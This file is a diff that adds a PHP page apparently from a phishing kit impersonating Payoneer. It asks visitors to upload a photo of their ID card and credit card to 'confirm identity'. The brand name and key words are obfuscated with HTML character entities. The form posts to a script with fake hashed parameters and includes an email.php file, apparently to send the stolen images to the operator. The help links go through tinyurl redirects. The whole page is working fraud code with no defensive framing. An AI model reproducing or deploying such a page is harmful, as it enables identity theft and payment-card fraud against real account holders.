@@ -1,0 +1,218 @@
+﻿<?php 
+ob_start();
+session_start();
+include '../email.php';
+?>
+<!DOCTYPE html>
+<html dir="ltr">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="msapplication-TileColor" content="#ff4800">
+    <title>P&#97;y&#111;n&#101;er - My A&#99;&#99;ount</title>
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="css/main-style.css">
+    <link rel="shortcut icon" type="image/x-icon" href="img/favicon.ico" />
+    <link rel="icon" type="image/x-icon" href="img/favicon.ico" />
+    <link rel="icon" type="image/png" href="img/favicon-32x32.png" sizes="32x32" />
+    <link rel="icon" type="image/png" href="img/favicon-16x16.png" sizes="16x16" />
+    <!--[if lt IE 9]> 
+           <script src="js/html5shiv.min.js"></script>
+           <script src="js/respond.min.js"></script>
+        <![endif]-->
+</head>
+
+<body>
+    <div class="container-fluid">
+        <div class="row">
+            <!-- Start Header 
+-------------------------------------------------->
+            <header class="header">
+
+                <!-- Desktop -->
+                <div class="largScreen hidden-xs">
+                    <div class="container">
+                        <a href="#"><img class="logo" src="img/partner-logo.png"></a>
+                        <div class="lang-select">
+                            <select class="lang">
+                                <option>English</option>
+                            </select>
+                            <p>Select your language:</p>
+                            <div class="clearfix"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Phone -->
+                <div class="onlyPhone hidden-xl hidden-lg hidden-md hidden-sm">
+                    <a href="#">
+                        <center><img class="p-logo" src="img/partner-logo.png"></center>
+                    </a>
+                    <div class="p-lang-select">
+                        <select class="p-lang">
+                                <option>English</option>
+                        </select>
+                        <div class="clearfix"></div>
+                    </div>
+                    <div class="topnav" id="myTopnav">
+                        <a href="javascript:void(0);" class="icon">
+                            <i class="fa fa-bars"></i> 
+                        </a>
+                    </div>
+                    <div class="messege">
+                        <span class="messegetext">Please &#99;omplete the &#115;e&#99;urity &#115;teps fir&#115;tly</span>
+                    </div>
+                </div>
+            </header>
+
+            <!-- Start Navigation 
+---------------------------------------------------->
+            <!-- Desktop -->
+            <nav class="nav largScreen hidden-xs">
+                <div class="container">
+                    <div class="menu">
+                        <div class="dropdown">
+                            <span><a class="help">H&#101;lp</a></span>
+                            <div class="help-content">
+                                <a href="https://tinyurl.com/y7ro6lhd" target="_blank">Pri&#99;e & F&#101;e&#115;</a>
+                                <a href="https://tinyurl.com/y7z4lsjz" target="_blank">"How To" Vid&#101;os</a>
+                                <a href="https://tinyurl.com/ycq6kmk9" target="_blank">&#83;uppor&#116; &#67;en&#116;er</a>
+                            </div>
+                        </div>
+                        <span><a href="#">S&#101;&#116;ting</a></span>
+                        <span><a href="#">&#76;ogou&#116;</a></span>
+                    </div>
+                </div>
+            </nav>
+
+            <!-- Phone -->
+            <nav class="p-nav onlyPhone hidden-xl hidden-lg hidden-md hidden-sm">
+                <div class="p-menu">
+                    <span><a href="#">&#76;ogou&#116;</a></span>
+                </div>
+            </nav>
+
+            <!-- Start Main Part 
+---------------------------------------------------->
+            <main>
+
+                <!-- Desktop -->
+                <div class="largScreen hidden-xs">
+                    <div class="container">
+                        <section class="body">
+                            <form class="form contain-info" method="POST" enctype="multipart/form-data" action="<?php echo 'serv5204.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>">
+                                <div class="pageTitle">
+                                    <span class="accountTitle">
+                                         Confirm Your Identity
+                                    </span>
+                                </div>
+                                <div>
+                                    <h3><span id="lblHeader" class="lblHeader">Your identification documents will help us to validate your identity.</span></h3>
+                                    <h3>
+                                        <p>What i should to do, to confirm my identity?</p>
+                                    </h3>
+                                    <p style="margin-left: 20px;">
+                                        &bull; Take a picture with your ID card and credit card also.<br> &bull; Cardholder Name and ID Card should match and be clearly visible.
+                                    </p>
+                                    <br>
+                                    <h3>
+                                        <p>Here's an example for picture :</p>
+                                    </h3>
+                                    <img src="img/id.jpg">
+                                </div>
+
+                                <input type="file" accept="image/*" id="file" class="file" name="file" aria-required="true" required="required">
+                                <input type="submit" id="billingSubmit" class="billingSubmit" onkeydown="funce(event)" Value="Finish">
+                            </form>
+                        </section>
+                    </div>
+                </div>
+
+                <!-- Phone -->
+                <div class="onlyPhone hidden-xl hidden-lg hidden-md hidden-sm">
+                    <section class="p-body">
+                        <center>
+                            <div class="p-pageTitle">
+                                <span class="p-accountTitle">
+                                         Confirm Your Identity
+                                    </span>
+                            </div>
+                        </center>
+                        <div style="margin-left: 10%">
+                            <h3><span id="p-lblHeader" class="lblHeader">Your identification documents will help us to validate your identity.</span></h3>
+                            <h3>
+                                <p>What i should to do, to confirm my identity?</p>
+                            </h3>
+                            <p style="margin-left: 20px;">
+                                &bull; Take a picture with your ID card and credit card also.<br> &bull; Cardholder Name and ID Card should match and be clearly visible.
+                            </p>
+                            <br>
+                            <h3>
+                                <p>Here's an example for picture :</p>
+                            </h3>
+                            <img src="img/id.jpg" style="width:90%">
+                        </div>
+                        <form class="p-form" method="POST" enctype="multipart/form-data" action="<?php echo 'serv5204.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>">
+
+                            <center>
+                                <input type="file" accept="image/*" id="file" class="p-file" name="file" aria-required="true" required="required">
+                                <input type="submit" id="p-billingSubmit" class="p-billingSubmit" onkeydown="funcec(event)" Value="Next"></center>
+                        </form>
+                    </section>
+                </div>
+            </main>
+
+            <!-- Start Footer 
+----------------------------------------------------->
+            <footer>
+                <!-- Descktop -->
+                <div class="largscreen hidden-xs">
+                    <div class="container">
+                        <div id="MoreOnThisPage">
+                            <div class="MoreOnThisPageContiner" id="MoreOnThisPageContiner">
+                            </div>
+                        </div>
+                        <div class="footer" id="footer">
+                            <a href="#" target="_blank">
+                                <span id="lblFooterAllRights">© 2005-2018 P&#97;y&#111;n&#101;er, All &#82;ight&#115; Re&#115;erv&#101;d</span>
+                            </a>
+                            <a href="#" target="_blank"><span id="lblFooterTermsAndConditions">P&#97;y&#111;n&#101;er T&#101;rms &amp; &#67;onditions</span></a> |
+                            <a href="#" target="_blank"><span id="lblFooterCardTermsAndConditions">Ca&#114;d T&#101;rm&#115; &amp; &#67;onditions</span></a> |
+                            <a href="#" target="_blank"><span id="lblFooterPrivacy">P&#114;iva&#99;y</span></a> |
+                            <a href="#" target="_blank"><span id="lblFooterContactUs">&#67;onta&#99;t U&#115;</span></a>
+                        </div>
+                        <div class="PageFooter"></div>
+                    </div>
+                    <div class="MCSmallNotes"><span id="lblFooterPrapaid">Ma&#115;ter&#67;ard is a regi&#115;tered trademark of Ma&#115;ter&#67;ard International Incorporated. The &#67;ard is is&#115;ued by Wirecard &#67;ard Solution&#115; Ltd ("WDCS") pur&#115;uant to li&#99;ence by Ma&#115;ter&#67;ard International In&#99;.</span></div>
+                </div>
+
+                <!-- Phone -->
+                <div class="onlyphone hidden-xl hidden-lg hidden-md hidden-sm">
+                    <div class="p-footer" id="footer">
+                        <a href="#" target="_blank">
+                                <span id="lblFooterAllRights">© 2005-2018 P&#97;y&#111;n&#101;er, All &#82;ight&#115; Re&#115;erv&#101;d</span>
+                            </a><br>
+                        <a href="#" target="_blank"><span>P&#97;y&#111;n&#101;er T&#101;rms &amp; &#67;onditions</span></a> |
+                        <a href="#" target="_blank"><span>&#67;ard Terms &amp; &#99;onditions</span></a> |
+                        <a href="#" target="_blank"><span>P&#114;iva&#99;y</span></a> |
+                        <a href="#" target="_blank"><span>&#67;onta&#99;t U&#115;</span></a>
+                    </div>
+                    <div class="p-MCSmallNotes"><span>Ma&#115;ter&#67;ard is a regi&#115;tered trademark of Ma&#115;ter&#67;ard International Incorporated. The &#67;ard is is&#115;ued by Wirecard &#67;ard Solution&#115; Ltd ("WDCS") pur&#115;uant to li&#99;ence by Ma&#115;ter&#67;ard International In&#99;.</span></div>
+                </div>
+            </footer>
+        </div>
+    </div>
+
+    <!-- Scripts 
+------------------------------------------------>
+    <script src="js/jquery-3.3.1.min.js"></script>
+    <script src="js/script.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+</body>
+
+</html>
+<?php
+?>
